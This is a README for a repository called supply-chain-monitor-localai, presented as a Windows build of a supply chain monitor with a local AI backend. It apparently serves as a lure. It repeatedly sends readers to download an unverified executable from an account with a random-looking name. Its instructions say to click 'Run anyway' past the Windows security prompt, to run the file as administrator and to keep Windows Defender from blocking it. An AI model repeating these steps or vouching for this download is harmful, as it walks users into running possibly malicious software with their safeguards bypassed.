# 🧭 supply-chain-monitor-localai - Track supply data with local AI

[![Download the latest release](https://img.shields.io/badge/Download-Releases-4B8BBE?style=for-the-badge&logo=github&logoColor=white)](https://github.com/qintarfermidiracstatistics981/supply-chain-monitor-localai/releases)

## 🚀 Getting Started

`supply-chain-monitor-localai` helps you monitor supply chain activity with a local AI backend. It is a Windows app build for end users who want to download a release and run it on their computer.

Use the release page to get the latest version:

https://github.com/qintarfermidiracstatistics981/supply-chain-monitor-localai/releases

## 📥 Download and Install

1. Open the release page.
2. Find the newest release at the top of the page.
3. Download the Windows file from the release assets.
4. If the file is a ZIP archive, right-click it and choose **Extract All**.
5. Open the extracted folder.
6. Double-click the app file to start it.

If Windows shows a security prompt:
1. Click **More info**
2. Click **Run anyway**

If you see a ZIP file and not an EXE file, that is normal. Many Windows apps ship as a ZIP so you can unpack the files first.

## 🖥️ What You Need

This app is made for Windows desktops and laptops.

Recommended setup:
- Windows 10 or Windows 11
- 8 GB RAM or more
- 5 GB free disk space
- A modern CPU
- A steady internet connection for the first setup
- A local AI runtime if you want model-based analysis

For the best experience, use a machine with at least 16 GB RAM if you plan to work with larger models.

## ⚙️ How It Works

This app is a fork of the original Elastic supply chain monitor, with a local AI backend. That means it can use your own machine for AI tasks instead of sending data to a remote service.

Typical flow:
1. You open the app.
2. You load or connect your supply chain data.
3. The app checks patterns and events.
4. The local AI backend helps summarize what matters.
5. You review the results in the interface.

The local backend can use tools such as:
- vLLM
- llama.cpp

## 🔧 First Run Setup

After you open the app for the first time, follow these steps:

1. Start the program.
2. Let it finish loading.
3. If a setup screen appears, choose the local AI option.
4. Select the backend you want to use.
5. Point the app to your model file or model folder.
6. Save the settings.
7. Load your data source and run the first scan.

If the app asks for a model path, choose the folder where your AI model files are stored.

## 🧠 Choosing a Local AI Backend

This project supports local model backends so you can run AI features on your computer.

### vLLM
Use this if:
- You want high performance
- You have a stronger system
- You already use vLLM for local inference

### llama.cpp
Use this if:
- You want a simple local setup
- You want to run smaller models
- You prefer a light tool that works well on many PCs

If you are not sure which one to pick, start with llama.cpp. It is often easier for a first run.

## 📂 Using the App

After setup, you can use the app like this:

1. Open the program.
2. Load your supply chain data.
3. Review the scan results.
4. Check alerts and trends.
5. Use the AI summary to understand the data faster.
6. Export or save your report if the app provides that option.

The app is built to help you spot changes in supply data, review risk signals, and read plain-language summaries without digging through raw records.

## 🧾 Common File Types

You may see some of these file types in the release:
- `.exe` — the app file you can open on Windows
- `.zip` — a compressed folder that you must extract first
- model files — files used by the local AI backend

If you are not sure which file to open, choose the Windows `.exe` file if one is provided. If only a `.zip` file is available, extract it first.

## 🛠️ Basic Troubleshooting

### The app does not start
Try this:
1. Right-click the file
2. Choose **Run as administrator**
3. Check that the file is fully extracted if it came in a ZIP
4. Make sure Windows Defender did not block the file

### The app opens and closes right away
Try this:
1. Confirm you downloaded the full release asset
2. Re-extract the ZIP file
3. Open the app from the extracted folder
4. Check whether the app needs a local model path

### The AI backend does not load
Try this:
1. Check the backend setting in the app
2. Make sure your model file exists
3. Confirm the model format matches the backend
4. Restart the app after changing settings

### The app feels slow
Try this:
1. Close other large apps
2. Use a smaller local model
3. Lower the load on your machine
4. Use a backend that fits your hardware

## 🔍 Tips for Better Results

- Use clean, current data
- Keep your model files in one folder
- Start with a small local model
- Save your settings after each change
- Restart the app after changing the backend
- Use the same data source each time when testing

## 📌 What This Project Is For

This app is a local supply chain monitor with AI help. It is useful if you want:
- A desktop tool for supply chain review
- Local AI processing on your own machine
- Faster review of large data sets
- Simple summaries of supply events
- A Windows app you can download and run from a release

## 📦 Release Page

Use this page to download and run the latest Windows build:

https://github.com/qintarfermidiracstatistics981/supply-chain-monitor-localai/releases

## 🧩 Example Use Cases

You can use the app to:
- Review supplier activity
- Watch for unusual changes in supply records
- Check trends across shipments or orders
- Read AI-generated summaries of key events
- Keep analysis local on your own PC

## 🖱️ Windows Run Steps

If you want a quick path on Windows:

1. Visit the release page
2. Download the latest Windows asset
3. Extract the files if needed
4. Open the main app file
5. Allow Windows to finish the first launch
6. Set your local AI backend
7. Load your data and begin

## 🔐 Local Processing

Because this version uses a local AI backend, your data can stay on your machine during AI processing. That can help if you want more control over where your data goes.

## 🧰 Suggested Folder Layout

If you want a clean setup, use this layout:

- `Downloads`
  - `supply-chain-monitor-localai.zip`
- `Apps`
  - `supply-chain-monitor-localai`
- `Models`
  - `your-local-model-files`

This makes it easier to find the app and model files later.

## 📄 Where to Get Updates

Check the release page for new builds, fixes, and changes:

https://github.com/qintarfermidiracstatistics981/supply-chain-monitor-localai/releases